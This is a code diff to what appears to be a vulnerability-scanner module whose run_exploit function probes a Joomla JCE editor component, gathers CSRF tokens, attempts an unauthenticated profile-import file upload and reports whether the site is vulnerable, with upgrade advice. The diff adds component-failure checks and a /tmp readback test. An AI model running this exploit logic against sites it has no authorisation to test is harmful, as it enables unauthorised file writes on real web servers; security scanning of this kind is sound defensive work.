@@ -178,6 +178,14 @@ def _handler_specific_response(body: str) -> bool:
     )
 
 
+def _component_failure(body: str) -> str | None:
+    if re.search(r"Class\s+['\"][^'\"]+['\"]\s+not\s+found", body, re.IGNORECASE):
+        return "component-incompatible"
+    if re.search(r"layout\s+default.{0,40}(?:not found|não encontrado)", body, re.IGNORECASE):
+        return "component-incomplete"
+    return None
+
+
 def run_exploit(
     target_url: str,
     joomla_version: str | None = None,
@@ -194,11 +202,17 @@ def run_exploit(
 
     routed = sess.get("/index.php?option=com_jce")
     direct = sess.get("/components/com_jce/jce.php")
+    frontend_controller = sess.get("/components/com_jce/controller.php")
     route_gate = bool(routed.get("redirected") or routed.get("status") in {401, 403})
+    route_failure = _component_failure(routed.get("body", ""))
+    component_precheck = "component-incomplete" if frontend_controller.get("status") == 404 else None
+    direct_body = direct.get("body", "")
+    direct_live = bool(direct.get("status") == 200 and direct_body.strip())
     direct_gate = bool(
         direct.get("status") in {401, 403}
-        or re.search(r"\brestricted\b|not authorized|não autorizado", direct.get("body", ""), re.IGNORECASE)
+        or re.search(r"\brestricted\b|not authorized|não autorizado", direct_body, re.IGNORECASE)
     )
+    tmp_preflight = sess.get(f"/tmp/proofcms-missing-{rand_str(10)}.txt")
 
     token_candidates, checked_token_paths = _extract_csrf_candidates(sess)
     if not token_candidates:
@@ -231,19 +245,21 @@ def run_exploit(
     passive.exploit_ran = True
     upload_body = upload.get("body", "") if upload else ""
     handler_specific = _handler_specific_response(upload_body)
+    upload_failure = _component_failure(upload_body)
     if (
         not upload
         or upload.get("status") != 200
         or upload.get("redirected")
         or not handler_specific
     ):
-        externally_blocked = bool(upload and upload.get("redirected")) or route_gate or direct_gate
+        component_failure = upload_failure or route_failure or component_precheck
+        externally_blocked = bool(upload and upload.get("redirected")) or route_gate or direct_gate or bool(component_failure)
         passive.status = "BLOCKED_EXTERNAL" if externally_blocked else "NOT_CONFIRMED"
         passive.confidence = "MEDIUM"
         passive.detail = (
             f"JCE {passive.component_version or 'version unknown'} is in the affected range, but the profile-import "
             + (
-                "handler is authentication/access gated and was not reachable anonymously; external validation is blocked. "
+                f"handler could not be validated ({component_failure or 'authentication/access gated'}); external validation is blocked. "
                 if externally_blocked
                 else "request did not return a JCE-specific acceptance response. "
             )
@@ -254,12 +270,22 @@ def run_exploit(
         )
         passive.evidence = {
             "component_present": True,
-            "token_accepted": bool(handler_specific and upload and not upload.get("redirected")),
+            "token_state": (
+                "rejected"
+                if rejected_sources and upload is None
+                else "accepted"
+                if handler_specific and upload and not upload.get("redirected")
+                else "not-evaluated"
+            ),
             "handler_reached": handler_specific,
+            "component_state": component_failure or "unknown",
+            "frontend_controller_status": frontend_controller.get("status", 0),
             "frontend_route_status": routed.get("status", 0),
             "frontend_route_redirected": routed.get("redirected", False),
             "direct_endpoint_status": direct.get("status", 0),
-            "direct_endpoint_gated": direct_gate,
+            "direct_endpoint_live": direct_live,
+            "direct_endpoint_gated": direct_gate if direct_live else None,
+            "tmp_readback_status": tmp_preflight.get("status", 0),
             "write_reported": False,
             "readback_verified": False,
         }
@@ -306,14 +332,25 @@ def run_exploit(
             passive.action = f"Upgrade JCE to {PATCHED_VERSION} or later and delete {filename}."
             return passive
 
-    passive.status = "NOT_CONFIRMED"
-    passive.confidence = "MEDIUM"
-    passive.detail += (
-        f" The handler-specific response was observed, but no proof file was reachable after {attempts} attempt(s) "
-        f"in checked locations (/tmp/{filename}, /{filename}). No write is claimed and no cleanup filename is "
-        f"reported. CSRF token source: {token_source}."
-    )
-    passive.action = f"Upgrade JCE to {PATCHED_VERSION} or later."
+    readback_denied = tmp_preflight.get("status") in {401, 403}
+    passive.status = "VULNERABLE_UPLOAD_ONLY" if readback_denied else "NOT_CONFIRMED"
+    passive.confidence = "HIGH" if readback_denied else "MEDIUM"
+    if readback_denied:
+        passive.uploaded_filename = filename
+        passive.detail += (
+            " The JCE handler returned a specific upload-acceptance response, but the proof file could not be "
+            f"retrieved after {attempts} attempt(s). "
+            f" The /tmp readback control returned HTTP {tmp_preflight.get('status')}, so independent retrieval is "
+            "access-denied rather than absent. The upload is handler-reported but cannot be independently verified."
+        )
+        passive.action = f"Upgrade JCE to {PATCHED_VERSION} or later and inspect the Joomla tmp directory for {filename}."
+    else:
+        passive.detail += (
+            f" The handler-specific response was observed, but no proof file was reachable after {attempts} attempt(s) "
+            f"in checked locations (/tmp/{filename}, /{filename}). No write is claimed and no cleanup filename is "
+            f"reported. CSRF token source: {token_source}."
+        )
+        passive.action = f"Upgrade JCE to {PATCHED_VERSION} or later."
     return passive
 
 
@@ -351,9 +388,9 @@ def metadata() -> dict:
         "exploit_available": HAS_EXPLOIT,
         "exploit_modes": EXPLOIT_MODES,
         "intrusive": INTRUSIVE,
-        "module_version": "1.4.0",
-        "last_reviewed": "2026-03-20",
-        "updated": "2026-03-20",
+        "module_version": "1.5.0",
+        "last_reviewed": "2026-10-07",
+        "updated": "2026-10-07",
         "required_detectors": [],
         "references": [
             "https://www.joomlacontenteditor.net/news/item/jce-pro-2982-released",
